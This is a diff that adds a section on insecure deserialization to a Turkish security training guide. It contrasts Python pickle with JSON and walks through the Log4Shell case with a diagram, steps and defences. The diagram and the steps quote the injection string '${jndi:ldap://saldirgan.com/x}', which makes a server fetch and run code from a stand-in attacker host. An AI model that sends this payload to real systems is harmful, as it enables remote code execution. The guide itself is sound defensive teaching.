@@ -73,6 +73,44 @@ Kullanıcı girdisi bir **şablon motoruna** (Jinja2, Twig) kod olarak geçerse:
 {{7*7}}  → 49 dönerse şablon enjeksiyonu var → {{config}} → RCE'ye tırmanır
 ```
 
+### Deserialization (güvensiz serileştirme çözme) — vaka çalışması: Log4Shell
+
+Bu, ailenin **en soyut ama en yıkıcı** üyesidir çünkü girdi hiç "kod gibi görünmez" — sıradan bir veri yapısı (obje, log satırı) gibi görünür ve tam da bu yüzden fark edilmesi zordur.
+
+**Mekanizma (genel):** Bir program, bir veri yapısını (obje) bir bayt dizisine çevirip saklar/gönderir ("serileştirme"), sonra geri okur ("deserileştirme" — deserialization). Bazı diller/kütüphaneler, deserileştirme sırasında **saklanan tür bilgisine güvenip** o türün kodunu (constructor, `__wakeup`, `readObject` gibi yaşam döngüsü metodları) **otomatik çalıştırır**. Saldırgan, meşru bir veri yerine **kötü niyetli bir obje grafiği** (gadget chain) gönderirse, deserileştirme onu sessizce "veri" olarak değil "çalıştırılacak kod" olarak işler — yine aynı tema: **girdi kod olarak yorumlanıyor.**
+
+```python
+# ZAFİYETLİ — pickle, Python'da deserileştirirken KEYFİ KOD çalıştırabilir
+import pickle
+veri = pickle.loads(guvenilmeyen_bayt_dizisi)   # ASLA güvenilmeyen kaynaktan pickle.loads
+
+# GÜVENLİ — JSON, veri formatıdır; kod çalıştırma yeteneği YOKTUR
+import json
+veri = json.loads(guvenilmeyen_metin)            # sadece string/sayı/liste/dict üretir, kod çalıştırmaz
+```
+> **Neden JSON güvenli, pickle değil:** JSON bir **veri formatıdır** — ayrıştırıcı yalnızca sabit bir gramerden (string, sayı, dizi, obje) üretim yapar, hiçbir noktada "şimdi şu kodu çalıştır" diyemez. `pickle` (ve Java'nın yerleşik serileştirmesi) ise **rastgele sınıfları örnekleyip yaşam döngüsü metodlarını çağırabilir** — yani formatın kendisi "kod çalıştırma" yeteneğine sahiptir. Bu, [00-baslangic/bilgisayar-temelleri.md](../../00-baslangic/bilgisayar-temelleri.md)'deki "kodlama ≠ şifreleme ≠ çalıştırma" ayrımının ileri bir hâlidir: JSON *kodlar*, pickle *çalıştırır*.
+
+**Vaka çalışması — Log4Shell (CVE-2021-44228, Aralık 2021):** Milyonlarca Java uygulamasının kullandığı **Log4j** loglama kütüphanesi, log mesajları içinde `${jndi:...}` biçiminde bir **arama sözdizimini** (lookup) destekliyordu — amaç, loglara dinamik değer (ortam değişkeni gibi) eklemekti.
+
+```mermaid
+sequenceDiagram
+    participant A as Saldırgan
+    participant App as Zafiyetli Uygulama (Log4j)
+    participant L as Saldırganın LDAP sunucusu
+    A->>App: Herhangi bir alanı logla<br/>(User-Agent: ${jndi:ldap://saldirgan.com/x})
+    Note over App: Log4j string'i "veri" değil<br/>"aranacak ifade" olarak işler
+    App->>L: JNDI lookup: saldirgan.com'a bağlan
+    L->>App: Kötü niyetli Java sınıfını gönder
+    Note over App: Uygulama bu sınıfı DESERİLEŞTİRİP çalıştırır
+    App->>A: Uzaktan kod çalıştırma (RCE) başarılı
+```
+
+**Adım adım:** (1) Saldırgan, uygulamanın **loglayacağı herhangi bir alana** (User-Agent başlığı, kullanıcı adı, arama kutusu — yukarıdaki §1'deki "girdi her yerden gelebilir" temasının kanıtı) `${jndi:ldap://saldirgan.com/x}` yazar. (2) Log4j, bu string'i loglarken **düz metin sanmaz**, içindeki `${jndi:...}` sözdizimini bir **komut** olarak tanır ve saldırganın sunucusuna bağlanır. (3) Saldırganın sunucusu, kötü niyetli bir Java nesnesi döndürür. (4) Uygulama bu nesneyi **deserileştirip çalıştırır** — tam RCE.
+
+> **Neden bu kadar yıkıcıydı:** (a) Log4j hemen her Java uygulamasında (Minecraft'tan kurumsal yazılımlara) vardı → saldırı yüzeyi devasa. (b) Sömürü tetikleyicisi **herhangi bir loglanan metindi** — saldırgan HTTP başlığına, form alanına, hatta bir sohbet mesajına bu string'i koyarak tetikleyebiliyordu; enjeksiyon noktası sayısı pratikte sonsuzdu. (c) Kök neden yine aynıydı: **loglama gibi "zararsız" bir işlev, girdiyi kod olarak yorumluyordu** — SQLi'deki `'` karakterinin sorgu yapısını bozması ([sqli.md](sqli.md)) ile aynı tema, farklı bir yorumlayıcıda (Log4j'nin lookup motoru).
+
+**Savunma:** (1) Deserileştirmede **asla güvenilmeyen kaynağa güvenme** — mümkünse JSON gibi kod-çalıştıramayan formatlar kullan. (2) Log4j'de: `log4j2.formatMsgNoLookups=true` veya versiyon yükseltme (2.17.1+). (3) Genel olarak: "bu sadece bir log mesajı, zararsız" varsayımı yanlıştı; aşağıdaki §3'teki ortak ilke (kod/veriyi ayır, en az ayrıcalık, allow-list) burada da geçerlidir. (4) Bağımlılık taraması (SCA → [13-guvenli-kodlama-devsecops/devsecops-ssdlc.md](../../13-guvenli-kodlama-devsecops/devsecops-ssdlc.md)) — Log4Shell, OWASP Top 10:2025'in [A03 Software Supply Chain Failures](../owasp-top10-tam-rehber.md)'in ders kitabı örneğidir: sen hiç kod yazmasan bile, kullandığın **bir bağımlılık** seni RCE'ye açabilir.
+
 ---
 
 ## 3. Nüans: neden hepsi aynı savunmayı paylaşır?
